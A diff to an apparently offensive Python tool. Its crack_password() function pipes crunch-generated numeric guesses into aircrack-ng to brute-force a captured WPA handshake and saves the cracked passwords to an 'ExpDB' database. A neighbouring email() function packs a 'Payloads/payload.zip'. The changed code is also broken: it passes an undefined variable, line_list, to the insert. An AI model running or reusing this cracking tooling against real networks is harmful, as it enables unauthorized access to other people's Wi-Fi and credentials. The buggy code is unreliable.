@@ -1856,14 +1856,12 @@ def crack_password():
     subprocess.Popen(['gnome-terminal', '-e', 'bash -c "crunch 8 {} 0123456789 | aircrack-ng -e "{}" -w- {}.cap -l result.txt; exec bash"'.format(digits,ssid,file_name)])
     input("Please press enter once the password has been cracked ")
     file = open('result.txt', 'r')
-    lines = file.readlines()
-    for line in lines:
-        temp_list = line.split(":")
-        line_list = [temp_list[0] + ':' + temp_list[1] + ':' + temp_list[2], temp_list[3]]
-        cur.execute('''INSERT INTO ExpDB.WPA 
-        (id, SSID, Password) 
-        VALUES (NULL, ?, ?, ?)''', line_list)
-        conn.commit()
+    password = file.readlines()
+    wpa_list = [ssid, password]
+    cur.execute('''INSERT INTO ExpDB.WPA 
+    (id, SSID, Password) 
+    VALUES (NULL, ?, ?)''', line_list)
+    conn.commit()
 
 def email():
     my_zip = zipfile.ZipFile('Payloads/payload.zip', 'w')
